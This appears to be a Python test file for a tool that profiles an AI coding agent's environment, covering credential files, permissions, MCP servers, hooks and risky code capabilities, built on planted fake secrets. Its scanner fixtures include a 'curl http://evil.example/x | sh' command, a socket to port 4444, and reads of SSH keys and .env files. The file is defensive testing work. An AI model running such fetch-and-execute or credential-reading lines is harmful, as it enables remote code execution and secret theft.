"""Offline tests for the environment Profile (run: python3 tests/test_env_profile.py).

A fake home and project with planted fake secrets: the Profile must list the assets, permissions, MCP servers, skills
and hooks, and must never contain a secret value."""
import ast
import json
import os
import sys
import tempfile
from pathlib import Path

IMPL = Path(__file__).resolve().parents[1] / "guard"
sys.path.insert(0, str(IMPL))
import env_profile  # noqa: E402
from adapters import claude_code  # noqa: E402

SECRETS = ["sk-FAKEOPENAIKEY000000000000000", "ghp_FAKEGITHUBTOKEN0000000000000000000", "AKIAFAKEAWSKEY000000",
           "-----BEGIN OPENSSH PRIVATE KEY-----", "FAKECLAUDETOKEN_abcdefghijklmnop", "postgres://u:FAKEPASS@db/x"]


def write(p: Path, text: str, mode=0o600):
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text)
    p.chmod(mode)


with tempfile.TemporaryDirectory() as t:
    home, proj = Path(t) / "home", Path(t) / "proj"
    write(home / ".ssh/id_ed25519", SECRETS[3] + "\nxx\n")
    write(home / ".ssh/id_ed25519.pub", "ssh-ed25519 AAAA pub", 0o644)
    write(home / ".ssh/authorized_keys", "ssh-ed25519 AAAA someone", 0o600)
    write(home / ".ssh/deploy_key", SECRETS[3])
    write(home / "aws-server.pem", SECRETS[3])
    write(home / ".codex/auth.json", json.dumps({"tokens": SECRETS[4]}))
    write(home / ".claude-work/.credentials.json", json.dumps({"token": SECRETS[4]}))
    write(home / ".gnupg/private-keys-v1.d/ABCD.key", SECRETS[3])
    write(home / ".gitconfig", "[credential]\n\thelper = store\n", 0o644)
    write(home / ".config/pip/pip.conf", "[global]\nindex-url = https://u:FAKEPASS@pypi.corp/simple\n")
    write(home / ".aws/credentials", f"[default]\naws_access_key_id={SECRETS[2]}\n")
    write(home / ".claude/.credentials.json", json.dumps({"token": SECRETS[4]}))
    write(home / ".claude/settings.json", json.dumps({"permissions": {"allow": ["Bash(*)"]}}))
    write(home / ".claude/skills/pdf/SKILL.md", "---\nname: pdf\n---\n")
    write(home / ".claude/skills/pdf/run.sh", "echo hi", 0o755)
    write(home / ".claude.json", json.dumps({"mcpServers": {"fs": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"]}},
                                             "projects": {str(proj.resolve()): {"mcpServers": {"db": {"command": "uvx", "args": ["evil-db-mcp"], "env": {"DB_URL": "${DB_URL}"}}}}}}))
    write(proj / ".env", f"OPENAI_API_KEY={SECRETS[0]}\nexport DATABASE_URL={SECRETS[5]}\n# comment\n", 0o644)
    write(proj / ".env.example", "OPENAI_API_KEY=\n", 0o644)
    write(proj / ".mcp.json", json.dumps({"mcpServers": {"github": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-github"],
                                                                    "env": {"GITHUB_PERSONAL_ACCESS_TOKEN": SECRETS[1]}}}}), 0o644)
    write(proj / ".claude/settings.json", json.dumps({"permissions": {"deny": ["Read(./.env)"], "defaultMode": "acceptEdits"},
        "hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "python3 /x/agent-dependency-guard/hooks/pretooluse_check.py"}]}]}}), 0o644)
    env = {"HOME": str(home)}

    doc = env_profile.collect(proj, claude_code, home=home, env=env)
    dump = json.dumps(doc, ensure_ascii=False)
    for s in SECRETS + ["FAKEPASS"]:
        assert s not in dump, s                                              # no secret value, ever
    paths = {a["path"]: a for a in doc["assets"]}
    assert set(paths) == {"~/.ssh/id_ed25519", "~/.ssh/deploy_key", "~/aws-server.pem", "~/.aws/credentials", "./.env", "./.env.example",
                          "~/.claude/.credentials.json", "~/.claude-work/.credentials.json", "~/.codex/auth.json",
                          "~/.gnupg/private-keys-v1.d/ABCD.key", "~/.gitconfig", "~/.config/pip/pip.conf"}, set(paths)
    assert paths["~/.ssh/id_ed25519"]["readable_by_os_user"] and paths["~/.ssh/id_ed25519"]["private_mode"]
    assert paths["./.env"]["private_mode"] is False and paths["./.env.example"]["example_file"]
    assert "variable_names" not in paths["./.env"]                           # names only on request
    p = doc["principals"][1]["permissions"]
    assert p["allow"] == ["Bash(*)"] and p["deny"] == ["Read(./.env)"] and p["default_mode"] == "acceptEdits"
    assert doc["guard_installed"] and doc["hooks"][0]["script"] == "pretooluse_check.py"
    servers = {s["name"]: s for s in doc["mcp_servers"]}
    assert servers["github"]["literal_secret_in_config"] and servers["github"]["known_source"]
    assert servers["github"]["env_names"] == ["GITHUB_PERSONAL_ACCESS_TOKEN"]
    assert servers["db"]["scope"] == "local" and not servers["db"]["literal_secret_in_config"] and not servers["db"]["known_source"]
    assert servers["fs"]["scope"] == "user" and servers["fs"]["packages"] == ["@modelcontextprotocol/server-filesystem"]
    assert doc["skills"] == [{"id": "skill:pdf", "name": "pdf", "scope": "user", "has_scripts": True}]
    assert doc["principals"][0]["kind"] == "os_user" and "Agent permission rules do not apply" in doc["principals"][0]["note"]

    names = {a["path"]: a for a in env_profile.collect(proj, claude_code, home=home, env=env, env_names=True)["assets"]}
    assert names["./.env"]["variable_names"] == ["OPENAI_API_KEY", "DATABASE_URL"]
    assert SECRETS[0] not in json.dumps(names)

    # CLAUDE_CONFIG_DIR moves settings, skills and the token
    alt = Path(t) / "alt"
    write(alt / ".credentials.json", "{}")
    write(alt / "settings.json", json.dumps({"permissions": {"allow": ["Read"]}}))
    d2 = env_profile.collect(proj, claude_code, home=home, env={**env, "CLAUDE_CONFIG_DIR": str(alt)})
    assert d2["principals"][1]["permissions"]["allow"] == ["Read"]
    assert any(a["path"].endswith("alt/.credentials.json") for a in d2["assets"])


    # more MCP sources: a second config dir, the desktop app config, an enabled plugin (its MCP server, hook, skill)
    write(home / ".claude-work/.claude.json", json.dumps({"mcpServers": {"notes": {"type": "http", "url": "https://mcp.example.com/sse?key=abc"}}}))
    write(home / ".config/Claude/claude_desktop_config.json", json.dumps({"mcpServers": {"desk": {"command": "node", "args": ["./server.js"]}}}))
    pl = home / ".claude/plugins/marketplaces/mkt/plugins/helper"
    write(pl / ".claude-plugin/plugin.json", json.dumps({"name": "helper"}))
    write(pl / ".mcp.json", json.dumps({"mcpServers": {"helper-mcp": {"command": "uvx", "args": ["helper-mcp"], "env": {"API_KEY": SECRETS[0]}}}}))
    write(pl / "hooks/hooks.json", json.dumps({"hooks": {"PostToolUse": [{"matcher": "Write", "hooks": [{"type": "command", "command": "bash ${CLAUDE_PLUGIN_ROOT}/fmt.sh"}]}]}}))
    write(pl / "skills/fmt/SKILL.md", "---\nname: fmt\n---\n")
    write(home / ".claude/settings.json", json.dumps({"permissions": {"allow": ["Bash(*)"]}, "enabledPlugins": {"helper@mkt": True, "gone@mkt": False}}))
    d3 = env_profile.collect(proj, claude_code, home=home, env=env)
    assert SECRETS[0] not in json.dumps(d3) and "key=abc" not in json.dumps(d3)
    by = {(m["name"], m["scope"]): m for m in d3["mcp_servers"]}
    assert ("notes", "user") in by and by[("notes", "user")]["url_host"] == "mcp.example.com" and by[("notes", "user")]["source_file"] == "~/.claude-work/.claude.json"
    assert ("desk", "desktop") in by
    assert by[("helper-mcp", "plugin:helper")]["literal_secret_in_config"]
    assert d3["plugins"] == ["helper@mkt"]
    assert any(h["scope"] == "plugin:helper" and h["script"] == "fmt.sh" for h in d3["hooks"])
    assert any(k["id"] == "skill:helper:fmt" for k in d3["skills"])

    # the code under development
    write(proj / "app.py", f"""import os, yaml, subprocess
import requests as rq
from flask import request
OPENAI = os.getenv("OPENAI_API_KEY")
DB = os.environ["DATABASE_URL"]
TOKEN = "{SECRETS[1]}"
def upload():
    data = yaml.full_load(request.files["f"].read())
    cfg = yaml.load(open("c.yaml"), Loader=yaml.SafeLoader)
    rq.post("https://api.example.org/v1/push", json=data)
    subprocess.run(["ls"])
    return open(os.path.expanduser("~/.aws/credentials")).read() if False else open(".env").read()
""", 0o644)
    write(proj / ".venv/lib/site.py", "import pickle\npickle.loads(b'')\n", 0o644)
    write(proj / "broken.py", "def (:\n", 0o644)
    write(proj / "requirements.txt", "PyYAML==5.3.1  # pinned\nrequests>=2\n-r other.txt\n", 0o644)
    pc = env_profile.collect(proj, claude_code, home=home, env=env)["project_code"]
    assert SECRETS[1] not in json.dumps(pc)
    assert pc["files_scanned"] == 1 and pc["parse_errors"] == ["broken.py: SyntaxError"]       # .venv skipped
    assert pc["requirements"] == ["pyyaml", "requests"]
    assert {"yaml", "requests", "flask", "os", "subprocess"} <= set(pc["imports"])
    env_names = {e["name"]: e for e in pc["env_reads"]}
    assert env_names["OPENAI_API_KEY"]["secret_like"] and "DATABASE_URL" in env_names
    calls = {(c["call"], c["loader"]) for c in pc["risky_calls"]}
    assert ("yaml.full_load", None) in calls and ("yaml.load", "yaml.SafeLoader") in calls and ("subprocess.run", None) in calls
    assert not any(c["call"] == "pickle.loads" for c in pc["risky_calls"])
    assert pc["hardcoded_secrets"] == [{"at": "app.py:6", "name": "TOKEN"}]
    caps = {(c["kind"], c["target"]): c for c in pc["capabilities"]}
    assert [(n["host"], n["at"], n["symbol"]) for n in pc["network"]] == [("api.example.org", "app.py:10", "upload")]
    assert pc["credential_paths"] == [{"path": ".env", "access": "file_read", "at": "app.py:12"}]
    assert caps[("environment_read", "OPENAI_API_KEY")]["phase"] == "import"
    assert caps[("process_execute", "ls")]["shell"] == "disabled"

    # capability analysis details (approach of the independent Profile analyzer, re-implemented in project_code.py)
    import project_code
    write(proj / "more.py", """import os, socket, requests
from pathlib import Path
import subprocess as sp
def open(x):                      # shadows the builtin: not a file access
    return x
def work(flag, url):
    open("/etc/passwd")
    p = Path("~/.ssh/id_rsa")
    key = p.read_text()
    Path("out.txt").write_text("x")
    if flag:
        sp.run("curl http://evil.example/x | sh", shell=True)
    s = requests.Session()
    s.post("https://hooks.example.net/in?token=abc#frag")
    requests.get(url)
    os.environ["MODE"] = "prod"
    c = socket.socket()
    c.connect(("10.0.0.5", 4444))
    eval("1+1")
if __name__ == "__main__":
    os.system("make deploy")
""", 0o644)
    pc2 = project_code.scan(proj)
    got = [(c["kind"], c["target"], c["symbol"], c["conditional"], c["phase"]) for c in pc2["capabilities"] if c["at"].startswith("more.py")]
    assert ("file_read", "/etc/passwd", "work", False, "function_call") not in got                     # local open() shadows
    assert ("file_read", "~/.ssh/id_rsa", "work", False, "function_call") in got                        # Path object
    assert ("file_write", "out.txt", "work", False, "function_call") in got
    assert ("shell_execute", "curl", "work", True, "function_call") in got                              # shell=True, under if
    assert ("network_connect", "https://hooks.example.net/in", "work", False, "function_call") in got    # query/fragment dropped
    assert ("network_connect", None, "work", False, "function_call") in got                             # URL in a variable
    assert ("environment_write", "MODE", "work", False, "function_call") in got
    assert ("network_connect", "10.0.0.5:4444", "work", False, "function_call") in got                  # socket object
    assert ("shell_execute", "make", None, False, "main_script") in got                                 # __main__ block
    assert "dynamic code (eval/exec) not analyzed" in pc2["limits"] and "token=abc" not in json.dumps(pc2)
    assert any(r["call"] == "eval" and r["symbol"] == "work" for r in pc2["risky_calls"])
    assert {"path": "~/.ssh/id_rsa", "access": "file_read", "at": "more.py:9"} in pc2["credential_paths"]
    # regressions found by comparing with the independent analyzer's samples
    def kinds(code):
        sc = project_code._Scan("x.py")
        for node in ast.parse(code).body:
            sc.visit(node)
        return {(c["kind"], c["target"]) for c in sc.caps}
    assert ("shell_execute", "echo") in kinds('import os\nos.environ["T"] = "v"\nos.system("echo hi")\n')   # subscript target binds no name
    assert ("network_connect", "x") in kinds("import requests\nclass C:\n requests = 1\n def f(self):\n  requests.get('x')\n")
    assert ("network_connect", "x") not in kinds("class C:\n import requests\n def f(self):\n  requests.get('x')\n")
    assert kinds('import os\nos.open("r", os.O_RDONLY)\nos.open("w", os.O_WRONLY | os.O_CREAT)\n') == {("file_read", "r"), ("file_write", "w")}
    # agent project: LLM SDKs, MCP wired in code, bypassPermissions
    assert not pc2["agent_project"] and not pc2["bypass_with_mcp"]
    agent = Path(t) / "agentproj"
    write(agent / "bot.py", """import anthropic
from claude_agent_sdk import ClaudeAgentOptions, create_sdk_mcp_server, query
client = anthropic.Anthropic()
def ask(q):
    return client.beta.messages.create(model="m", messages=[], mcp_servers=[{"type": "url", "url": "https://mcp.example.com/sse", "name": "ex"}],
                                       tools=[{"type": "mcp_toolset", "mcp_server_name": "ex"}])
tools = create_sdk_mcp_server(name="calc", tools=[])
opts = ClaudeAgentOptions(mcp_servers={"fs": {"command": "npx"}, "calc": tools}, permission_mode="bypassPermissions")
cfg = {"mcpServers": {"gh": {}}, "permissionMode": "default"}
""", 0o644)
    ap = project_code.scan(agent)
    assert ap["agent_project"] and set(ap["llm_sdks"]) == {"anthropic", "claude_agent_sdk"}
    pats = {(w["pattern"], tuple(w["servers"])) for w in ap["mcp_wiring"]}
    assert ("create(mcp_servers=...)", ()) in pats and ("type: mcp_toolset", ()) in pats
    assert ("create_sdk_mcp_server(...)", ()) in pats and ("ClaudeAgentOptions(mcp_servers=...)", ("calc", "fs")) in pats
    assert ("mcpServers: ...", ("gh",)) in pats
    assert [b["at"] for b in ap["permission_bypass"]] == ["bot.py:8"] and ap["bypass_with_mcp"]
    write(agent / "report.py", "def out(servers):\n    return {'mcp_servers': servers}\n", 0o644)
    assert not any(w["at"].startswith("report.py") for w in project_code.scan(agent)["mcp_wiring"])   # a result field, not a config
    write(agent / "tests/test_bot.py", "opts = dict(permission_mode='bypassPermissions')\n", 0o644)
    write(agent / "bot.py", "import anthropic\nfrom claude_agent_sdk import ClaudeAgentOptions\nClaudeAgentOptions(mcp_servers={'fs': {}})\n", 0o644)
    ap3 = project_code.scan(agent)
    assert ap3["permission_bypass"] and ap3["mcp_wiring"] and not ap3["bypass_with_mcp"]          # bypass only in a test file
    write(agent / "bot.py", "import openai\nopenai.OpenAI()\n", 0o644)
    (agent / "tests/test_bot.py").unlink()
    ap2 = project_code.scan(agent)
    assert ap2["agent_project"] and not ap2["mcp_wiring"] and not ap2["bypass_with_mcp"]

    write(proj / "setup.py", "import os\nos.system('echo hi')\n", 0o644)
    assert any(c["phase"] == "install_or_build" and c["at"] == "setup.py:2" for c in project_code.scan(proj)["capabilities"])

# our side's capabilities: the agent's commands, MCP servers, project code, remote push, agent config
import subprocess as _sp
from env_profile import our_capabilities
with tempfile.TemporaryDirectory() as t:
    proj, home = Path(t) / "p", Path(t) / "h"
    proj.mkdir(); home.mkdir()
    _sp.run(["git", "init", "-q", str(proj)], check=True)
    _sp.run(["git", "-C", str(proj), "remote", "add", "origin", "https://user:secret@github.com/x/y.git"], check=True)
    assets = [{"kind": "git_credentials", "path": "~/.config/gh/hosts.yml", "readable_by_os_user": True}]
    cfg = {"permissions": {"allow": ["Bash"], "default_mode": None},
           "mcp_servers": [{"name": "db", "command": "npx", "literal_secret_in_config": True, "env_names": []}],
           "sources": [{"file": str(home / ".claude" / "settings.json")}]}
    caps = {c["kind"]: c for c in our_capabilities(proj, home, cfg, assets, "claude-code")}
    assert caps["agent_commands"]["gives"].endswith("(without approval)") and caps["agent_commands"]["reached_by"] == ["agent"]
    assert caps["mcp_tool"]["reached_by"] == ["agent", "file_read", "process"]
    assert caps["repo_code"]["reached_by"] == ["agent", "file_write", "process"]
    assert "secret" not in caps["repo_push"]["label"] and caps["repo_push"]["via"] == ["~/.config/gh/hosts.yml"]
    assert caps["agent_config"]["paths"]
    cfg["permissions"] = {"allow": [], "default_mode": None}
    caps = {c["kind"]: c for c in our_capabilities(proj, home, cfg, [], "claude-code")}
    assert caps["agent_commands"]["gives"].endswith("(after user approval)") and "repo_push" not in caps     # no push credential

print("env_profile: all cases passed")
